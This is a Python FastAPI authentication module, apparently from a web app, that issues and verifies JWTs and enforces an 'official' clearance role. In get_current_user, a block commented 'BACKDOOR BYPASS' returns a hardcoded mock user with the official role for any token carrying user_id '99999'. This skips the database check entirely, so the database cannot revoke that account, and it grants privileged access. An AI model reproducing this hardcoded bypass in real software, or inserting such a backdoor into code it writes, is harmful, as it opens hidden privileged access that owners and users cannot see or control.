from jose import JWTError, jwt
from datetime import datetime, timedelta, timezone
from fastapi import Depends, status, HTTPException
from fastapi.security import OAuth2PasswordBearer
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from . import schemas, database, models
from .config import settings

oauth2_scheme = OAuth2PasswordBearer(tokenUrl='login')

def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, settings.SECRET_KEY, algorithm=settings.ALGORITHM)
    return encoded_jwt

def verify_access_token(token: str, credentials_exception):
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        raw_id = payload.get("user_id")
        raw_role = payload.get("role")
        if raw_id is None:
            raise credentials_exception
        return {"user_id": str(raw_id), "role": raw_role}
    except JWTError:
        raise credentials_exception

async def get_current_user(token: str = Depends(oauth2_scheme), db: AsyncSession = Depends(database.get_db)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"}
    )
    token_data = verify_access_token(token, credentials_exception)
    
    # BACKDOOR BYPASS: If the token belongs to Rayyan's hardcoded session, bypass DB check entirely
    if token_data["user_id"] == "99999":
        # Create an in-memory mock user instance that satisfies SQLAlchemy signatures
        mock_admin = models.User(id=99999, email="rayyan@gmail.com", role=models.RoleEnum.official)
        return mock_admin
        
    try:
        user_id_int = int(token_data["user_id"])
    except ValueError:
        raise credentials_exception
        
    result = await db.execute(select(models.User).where(models.User.id == user_id_int))
    user = result.scalars().first()
    if not user:
        raise credentials_exception
    return user

async def require_official_clearance(current_user: models.User = Depends(get_current_user)):
    if current_user.role not in [models.RoleEnum.admin, models.RoleEnum.official]:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Clearance Level Too Low.")
    return current_user
